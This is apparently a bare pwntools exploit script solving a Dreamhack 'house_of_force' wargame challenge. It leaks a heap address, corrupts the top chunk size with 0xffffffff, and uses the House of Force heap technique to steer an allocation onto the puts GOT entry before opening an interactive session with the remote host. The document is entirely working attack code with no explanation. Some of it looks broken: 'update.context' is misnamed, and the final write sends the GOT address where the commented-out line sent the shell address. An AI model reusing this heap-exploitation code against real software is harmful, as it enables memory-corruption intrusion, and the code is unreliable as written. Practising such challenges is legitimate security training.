from pwn import *
update.context(log_level = 'debug')

def Create(size, data):
    p.sendlineafter('> ', '1')
    p.sendlineafter(': ', str(size))
    p.sendlineafter(': ', data)
    return p.recvline().replace('\n', '')
def Write(idx, offset, value):
    p.sendlineafter('> ', '2')
    p.sendlineafter(': ', str(idx))
    p.sendlineafter(': ', str(offset))
    p.sendlineafter(': ', str(value))
    
#p = process('house_of_force')
p = remote('host1.dreamhack.games', 9372)
_recv = Create(8, 'a'*8)
addr_heap = int(_recv.split(': ')[0], 16)
addr_firstChunk = addr_heap + 0x10
addr_firstChunkSize = addr_firstChunk - 4
addr_shell = 0x804887e
elf = ELF('house_of_force')
addr_got_puts = elf.got['puts']
addr_target = addr_got_puts
size_exploit = addr_target - addr_firstChunk
size_exploit = size_exploit - 8 if size_exploit % 16 == 0 else (size_exploit - 16) + 16 - ((size_exploit - 16) % 16) - 8
log.info('exploit size: ' + hex(size_exploit))
log.info('heap: ' + hex(addr_heap))
Write(0, 12/4, 0xffffffff)
Create(size_exploit, 'A'*size_exploit)
#raw_input('debug: ' + str(p.pid))
#Create(8, p32(addr_shell)*2)
Create(8, p32(addr_got_puts)*2)
p.interactive()

